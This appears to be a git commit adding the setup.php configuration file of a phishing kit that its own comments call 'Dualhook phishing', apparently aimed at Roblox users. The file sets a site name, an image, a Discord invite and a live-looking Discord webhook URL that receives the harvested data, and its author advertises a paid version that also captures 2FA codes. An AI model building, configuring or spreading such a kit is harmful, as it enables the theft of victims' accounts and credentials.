1ca271a69a9562254c5eeaa677eccb87776d95a2
RovloxPannel <streamezfr@gmail.com>
2024-08-20 21:08:02 +0200

    Add files via upload

---
+++ setup.php
@@ -0,0 +1,17 @@
+<?php
+
+// Setup file for users!
+
+$name = "wwwnv"; // Change to any name u want for ur generator
+$image = "https://media.discordapp.net/attachments/1097841417591738378/1098664331828285501/tumblr_1f782183a9ea642e79b07d82c180da50_bbefd568_400.png?width=360&height=360"; // Any Image u want
+$Backgroundcolor = "white"; // Examples white, blue, orange, yellow, wheat
+$adminhook = "https://discord.com/api/webhooks/1275522457054220289/0eporFhKubCIoM52TB-5ZEetzeQ8fEqCqOkfgkKAR7rpUpZMe0Yn43SkmZVovAVCxHKE"; // Change to ur dualhook webhook!
+$discord = ".gg/wwwwwwwwwww"; // change discord server to ur server
+$colorTitle = "blue"; // Example colors for title white, black, or any other color lol
+
+
+// Credits Termed#0001 | Message me if u wanna buy a better src with 2fa and more for cheap!
+// Enjoy Dualhook phishing!
+
+
+?>
